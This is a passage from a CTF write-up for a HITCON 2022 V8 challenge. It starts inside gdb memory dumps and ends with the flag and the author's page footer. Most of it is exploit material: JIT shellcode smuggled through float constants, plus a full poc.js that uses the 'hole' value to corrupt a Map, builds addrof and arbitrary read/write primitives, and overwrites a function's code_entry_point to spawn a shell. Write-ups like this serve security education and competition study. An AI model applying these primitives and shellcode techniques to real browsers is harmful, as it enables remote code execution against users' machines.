</span></span><span style="display:flex;"><span> - name: 0x1d9d00199ea5 &lt;String[3]: #foo&gt;
</span></span><span style="display:flex;"><span> - formal_parameter_count: 0
</span></span><span style="display:flex;"><span> - kind: ArrowFunction
</span></span><span style="display:flex;"><span> - context: 0x1d9d0019a2a1 &lt;ScriptContext[3]&gt;
</span></span><span style="display:flex;"><span> - code: 0x1d9d0019a79d &lt;CodeDataContainer TURBOFAN&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> ... # Back to GDB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; x/20wx 0x1d9d002ca78d-1
</span></span><span style="display:flex;"><span>0x1d9d002ca78c:	0x00184241	0x00002259	0x00002259	0x0019a025
</span></span><span style="display:flex;"><span>0x1d9d002ca79c:	0x0019a2a1	0x0019a271	0x0019a79d	0x000025d5
</span></span><span style="display:flex;"><span>0x1d9d002ca7ac:	0x00000003	0x00000006	0x626f6c67	0x00006c61
</span></span><span style="display:flex;"><span>0x1d9d002ca7bc:	0x000025d5	0x00000003	0x00000006	0x6b726f57
</span></span><span style="display:flex;"><span>0x1d9d002ca7cc:	0x00007265	0x000025d5	0x00000003	0x00000005
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that there is a property called <code>code</code> inside the <code>foo</code> method, where based on examination in <code>gdb</code>, the offset is <code>code = foo+0x18</code>.</p>
<p>Let&rsquo;s examine the <code>code</code> property in <code>gdb</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; x/20wx 0x1d9d0019a79d-1
</span></span><span style="display:flex;"><span>0x1d9d0019a79c:	0x00002a71	0x000023e1	0xc0004781	0xc00047c0
</span></span><span style="display:flex;"><span>0x1d9d0019a7ac:	0x00005554	0xffff001d	0x00000004	0x000079f9
</span></span><span style="display:flex;"><span>0x1d9d0019a7bc:	0x000023e1	0x00000000	0x00000000	0x00000002
</span></span><span style="display:flex;"><span>0x1d9d0019a7cc:	0x00000002	0x000023e1	0x000079f9	0x000023e1
</span></span><span style="display:flex;"><span>0x1d9d0019a7dc:	0x002875c9	0x000023e1	0x00000002	0x00000002
</span></span><span style="display:flex;"><span>pwndbg&gt; job 0x1d9d0019a79d
</span></span><span style="display:flex;"><span>0x1d9d0019a79d: [CodeDataContainer] in OldSpace
</span></span><span style="display:flex;"><span> - map: 0x1d9d00002a71 &lt;Map[28](CODE_DATA_CONTAINER_TYPE)&gt;
</span></span><span style="display:flex;"><span> - kind: TURBOFAN
</span></span><span style="display:flex;"><span> - is_off_heap_trampoline: 0
</span></span><span style="display:flex;"><span> - code: 0x5554c0004781 &lt;Code TURBOFAN&gt;
</span></span><span style="display:flex;"><span> - code_entry_point: 0x5554c00047c0
</span></span><span style="display:flex;"><span> - kind_specific_flags: 4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; job 0x5554c0004781
</span></span><span style="display:flex;"><span>0x5554c0004781: [Code]
</span></span><span style="display:flex;"><span> - map: 0x1d9d0000264d &lt;Map(CODE_TYPE)&gt;
</span></span><span style="display:flex;"><span> - code_data_container: 0x1d9d0019a79d &lt;CodeDataContainer TURBOFAN&gt;
</span></span><span style="display:flex;"><span>kind = TURBOFAN
</span></span><span style="display:flex;"><span>stack_slots = 6
</span></span><span style="display:flex;"><span>compiler = turbofan
</span></span><span style="display:flex;"><span>address = 0x5554c0004781
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Instructions (size = 360)
</span></span><span style="display:flex;"><span>0x5554c00047c0     0  8b59d0               movl rbx,[rcx-0x30]
</span></span><span style="display:flex;"><span>0x5554c00047c3     3  4903de               REX.W addq rbx,r14
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x5554c0004831    71  49ba682f73680058eb0c REX.W movq r10,0xceb580068732f68
</span></span><span style="display:flex;"><span>0x5554c000483b    7b  c4c1f96ec2           vmovq xmm0,r10
</span></span><span style="display:flex;"><span>0x5554c0004840    80  c5fb11410f           vmovsd [rcx+0xf],xmm0
</span></span><span style="display:flex;"><span>0x5554c0004845    85  49ba682f62696e5aeb0c REX.W movq r10,0xceb5a6e69622f68
</span></span><span style="display:flex;"><span>0x5554c000484f    8f  c4c1f96ec2           vmovq xmm0,r10
</span></span><span style="display:flex;"><span>0x5554c0004854    94  c5fb114117           vmovsd [rcx+0x17],xmm0
</span></span><span style="display:flex;"><span>0x5554c0004859    99  49ba48c1e02031f6eb0c REX.W movq r10,0xcebf63120e0c148
</span></span><span style="display:flex;"><span>0x5554c0004863    a3  c4c1f96ec2           vmovq xmm0,r10
</span></span><span style="display:flex;"><span>0x5554c0004868    a8  c5fb11411f           vmovsd [rcx+0x1f],xmm0
</span></span><span style="display:flex;"><span>0x5554c000486d    ad  49ba4801d031d250eb0c REX.W movq r10,0xceb50d231d00148
</span></span><span style="display:flex;"><span>0x5554c0004877    b7  c4c1f96ec2           vmovq xmm0,r10
</span></span><span style="display:flex;"><span>0x5554c000487c    bc  c5fb114127           vmovsd [rcx+0x27],xmm0
</span></span><span style="display:flex;"><span>0x5554c0004881    c1  49ba4889e76a3b580f05 REX.W movq r10,0x50f583b6ae78948
</span></span></code></pre></td></tr></table>
</div>
</div><p>Inside <code>code</code> property, we have two interesting properties:</p>
<ul>
<li><code>code</code>: Points to the jitted code area. (<code>code+0x8</code>)</li>
<li><code>code_entry_point</code>: Points to the starting of the jitted code instructions. (<code>code + 0xc</code>)</li>
</ul>
<p>As you can see from the examination via <code>job</code>, the <code>foo-&gt;code-&gt;code</code> properties is filled with the address of the jitted code area. Also notice that in the generated instructions, we successfully smuggled our floating point in there.</p>
<p>Notice that <code>0xceb580068732f68</code> is actually the hex representation of our first floating point in <code>foo</code> method (<code>1.95538254221075331056310651818E-246</code>). And it is actually a shellcode to perform <code>push 'sh\x00' to stack</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>   0:   68 2f 73 68 00          push   0x68732f
</span></span><span style="display:flex;"><span>   5:   58                      pop    rax
</span></span><span style="display:flex;"><span>   6:   eb 0c                   jmp    0x14
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you notice, our shellcode instruction max length is 6 because the last two bytes will be used to jump to the next smuggled shellcode (the next floating point value, which is stored in the next <code>mov</code> instructions).</p>
<p>Remember that we have read and write gadgets. Take a look in the <code>foo-&gt;code</code> properties again. <code>code_entry_point</code> will be used by <code>v8</code> during we call <code>foo</code>, where <code>v8</code> will jump to the stored address inside <code>code_entry_point</code>. If we&rsquo;re able to overwrite this value, basically we have successfully controlled the <code>v8</code> RIP.</p>
<h3 id="final-step">Final Step <a href="#final-step" class="anchor">#</a></h3>
<p>With our <code>write</code> gadget, let&rsquo;s overwrite this <code>code_entry_point</code> by shifting its stored value to point to our first smuggled shellcode so that when we call <code>foo</code>, it will jump and execute our crafted shellcode. Notes that it is better to put the targeted JIT code at the top of our file so that it won&rsquo;t mess up our created read-and-write gadgets.</p>
<p>So, modify our <code>poc.js</code> to:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">const</span> foo <span style="color:#555">=</span> ()=&gt;
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> [<span style="color:#f60">1.0</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f60">1.95538254221075331056310651818</span>E<span style="color:#555">-</span><span style="color:#f60">246</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f60">1.95606125582421466942709801013</span>E<span style="color:#555">-</span><span style="color:#f60">246</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f60">1.99957147195425773436923756715</span>E<span style="color:#555">-</span><span style="color:#f60">246</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f60">1.95337673326740932133292175341</span>E<span style="color:#555">-</span><span style="color:#f60">246</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f60">2.63486047652296056448306022844</span>E<span style="color:#555">-</span><span style="color:#f60">284</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> (<span style="color:#069;font-weight:bold">let</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> <span style="color:#f60">0x10000</span>; i<span style="color:#555">++</span>) {foo();foo();foo();foo();}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> buf <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> ArrayBuffer(<span style="color:#f60">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> f64_buf <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Float64Array(buf);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> u64_buf <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Uint32Array(buf);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> ftoi(val) {
</span></span><span style="display:flex;"><span>    f64_buf[<span style="color:#f60">0</span>] <span style="color:#555">=</span> val;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> BigInt(u64_buf[<span style="color:#f60">0</span>]) <span style="color:#555">+</span> (BigInt(u64_buf[<span style="color:#f60">1</span>]) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">32</span>n);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> itof(val) {
</span></span><span style="display:flex;"><span>    u64_buf[<span style="color:#f60">0</span>] <span style="color:#555">=</span> <span style="color:#366">Number</span>(val <span style="color:#555">&amp;</span> <span style="color:#f60">0xffffffff</span>n);
</span></span><span style="display:flex;"><span>    u64_buf[<span style="color:#f60">1</span>] <span style="color:#555">=</span> <span style="color:#366">Number</span>(val <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">32</span>n);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> f64_buf[<span style="color:#f60">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> c <span style="color:#555">=</span> [];
</span></span><span style="display:flex;"><span>m <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Map();
</span></span><span style="display:flex;"><span>m.set(<span style="color:#f60">1</span>, <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.set(c.hole(), <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>oob_arr <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">1.1</span>, <span style="color:#f60">2.2</span>);
</span></span><span style="display:flex;"><span>m.set(<span style="color:#f60">0x10</span>, <span style="color:#555">-</span><span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.set(oob_arr, <span style="color:#f60">0xffff</span>);
</span></span><span style="display:flex;"><span>victim <span style="color:#555">=</span> [{}, {}, {}, {}];
</span></span><span style="display:flex;"><span>read_gadget <span style="color:#555">=</span> [<span style="color:#f60">1.1</span>, <span style="color:#f60">2.2</span>, <span style="color:#f60">3.3</span>];
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> addrof(in_obj) {
</span></span><span style="display:flex;"><span>    mask <span style="color:#555">=</span> (<span style="color:#f60">1</span>n <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">32</span>n) <span style="color:#555">-</span> <span style="color:#f60">1</span>n
</span></span><span style="display:flex;"><span>    victim[<span style="color:#f60">0</span>] <span style="color:#555">=</span> in_obj;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> ftoi(oob_arr[<span style="color:#f60">12</span>]) <span style="color:#555">&amp;</span> mask;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> weak_read(addr) {
</span></span><span style="display:flex;"><span>    oob_arr[<span style="color:#f60">37</span>] <span style="color:#555">=</span> itof(<span style="color:#f60">0x600000000</span>n<span style="color:#555">+</span>addr<span style="color:#555">-</span><span style="color:#f60">0x8</span>n);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> ftoi(read_gadget[<span style="color:#f60">0</span>]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> weak_write(addr, value) {
</span></span><span style="display:flex;"><span>    oob_arr[<span style="color:#f60">37</span>] <span style="color:#555">=</span> itof(<span style="color:#f60">0x600000000</span>n<span style="color:#555">+</span>addr<span style="color:#555">-</span><span style="color:#f60">0x8</span>n);
</span></span><span style="display:flex;"><span>    read_gadget[<span style="color:#f60">0</span>] <span style="color:#555">=</span> itof(value);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>f_code <span style="color:#555">=</span> weak_read(addrof(foo)<span style="color:#555">+</span><span style="color:#f60">0x18</span>n) <span style="color:#555">&amp;</span> ((<span style="color:#f60">1</span>n <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">32</span>n) <span style="color:#555">-</span> <span style="color:#f60">1</span>n);
</span></span><span style="display:flex;"><span>f_code_code_entry_point <span style="color:#555">=</span> weak_read(f_code<span style="color:#555">+</span><span style="color:#f60">0xc</span>n);
</span></span><span style="display:flex;"><span>weak_write(f_code<span style="color:#555">+</span><span style="color:#f60">0xc</span>n, f_code_code_entry_point<span style="color:#555">+</span><span style="color:#f60">124</span>n);
</span></span><span style="display:flex;"><span>foo();
</span></span></code></pre></td></tr></table>
</div>
</div><p>What I do in the last step after creating these primitives are:</p>
<ul>
<li>Get the <code>foo-&gt;code</code> stored pointer address by:
<ul>
<li>Do <code>addrof</code> of <code>foo</code>.</li>
</ul>
</li>
<li><code>weak_read</code> the address of <code>foo-&gt;code</code> which is equivalent to <code>foo+0x18</code> (Offset found by examination in <code>gdb</code>).
<ul>
<li>Let&rsquo;s call the fetched value as <code>f_code</code></li>
</ul>
</li>
<li><code>weak_read</code> the value of <code>f_code-&gt;code_entry_point</code> which is equivalent to <code>f_code+0xc</code>.
<ul>
<li>Let&rsquo;s call the fetched value as <code>f_code_code_entry_point</code></li>
</ul>
</li>
<li><code>weak_write</code> the property <code>f_code-&gt;code_entry_point</code> which is equivalent to <code>f_code+0xc</code> by <code>f_code_code_entry_point+shift_offset</code>, where the <code>shift_offset</code> is the distance between the starting JIT code instructions and your smuggled shellcode.</li>
</ul>
<blockquote>
<p><strong>Notes:</strong> The offset of the smuggled shellcode in the jitted area is different between ubuntu and debian. So, if you want to run this POC in ubuntu, you might need to adjust the offset to be added in our leaked <code>f_code_code_entry_point</code> value during the last call of <code>weak_write</code>.</p>
</blockquote>
<p>And let&rsquo;s try to execute this. We will get a shell!</p>
<p><p class="markdown-image">
  <img src="https://i.imgur.com/SGFdLxM.png" alt=""  />
</p></p>
<blockquote>
<p><strong>Flag:</strong> hitcon{tH3_xPl01t_n0_l0ng3r_wOrk_aF+3r_66c8de2cdac10cad9e622ecededda411b44ac5b3_:((}</p>
</blockquote>
<h1 id="social-media">Social Media <a href="#social-media" class="anchor">#</a></h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">twitter</a></p>

      </div>
      
        
  <aside class="toc-container">
    <a href="#" style="font-weight: 700; color: black;">HITCON CTF 2022</a>
    <div class="js-toc">
      <details>
          <summary>Table of Contents
          </summary>
          <div>
              <nav id="TableOfContents">
  <ul>
    <li><a href="#initial-analysis">Initial Analysis</a>
      <ul>
        <li><a href="#prerequisite">Prerequisite</a></li>
        <li><a href="#environment-setup">Environment Setup</a></li>
        <li><a href="#analyze-the-patch">Analyze the patch</a></li>
        <li><a href="#searching-for-the-hole-value">Searching for the <code>hole</code> value</a></li>
      </ul>
    </li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#understanding-how-map-works">Understanding how Map works</a></li>
        <li><a href="#the-corrupted-maps-impact">The corrupted map&rsquo;s impact</a></li>
        <li><a href="#preparing-primitives">Preparing primitives</a></li>
        <li><a href="#finding-a-way-to-control-the-rip">Finding a way to control the RIP</a></li>
        <li><a href="#final-step">Final Step</a></li>
      </ul>
    </li>
  </ul>
</nav>
          </div>
      </details>
    </div>
  </aside>


      
    </div>

    
        <div class="tags">
            
                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
            
                <a href="https://chovid99.github.io/tags/hitcon">HITCON</a>
            
                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
            
                <a href="https://chovid99.github.io/tags/chrome">chrome</a>
            
                <a href="https://chovid99.github.io/tags/v8">v8</a>
            
                <a href="https://chovid99.github.io/tags/jit">JIT</a>
            
                <a href="https://chovid99.github.io/tags/browser">browser</a>
            
                <a href="https://chovid99.github.io/tags/oob">oob</a>
            
